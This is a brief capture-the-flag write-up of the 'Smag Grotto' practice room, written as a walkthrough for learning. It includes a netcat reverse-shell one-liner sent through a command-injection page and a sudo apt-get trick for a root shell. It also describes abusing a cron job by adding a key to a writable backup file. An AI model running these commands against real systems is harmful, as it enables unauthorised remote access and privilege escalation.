# Smag Grotto

The hint for this room is Wireshark, which is a strong hint. Ultimately the room was fairly straight forward.

1. recon revealed 80 and 22
2. on 80 there was a holding page. I ran a dirb, which revealed /mail. on their was a pcap that could be downloaded
3. the pcap showed a /login page and credentials for it, but also revealed the host should be development.smag.thm (browsing their normally would not show the site)
4. using burp to alter the host in repeater, I confirmed the page was there. with burp match and replace, I was able to auto-update my host header (no need for a hosts entry or anything)
5. the login page led to an admin page, with the ability to execute commands but without the response being printed (so ls or id returned nothing)
6. I sent `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.51.210 4444 >/tmp/f` to catch a reverse shell as www-data
7. naving around, couldn't see anything obvious. ended up running linpeas, which showed me the crontab (could have just done `cat /etc/crontab`):

    `*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys`
    
8. the backup file was writable. I added my pub key to the file, and then was able to ssh in as jake
9. sudo -l revealed apt-get was runnable as sudo. from gtfo-bins I used `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` to get a root shell

Easy, but fun. Haven't done a boot to root in a few weeks.
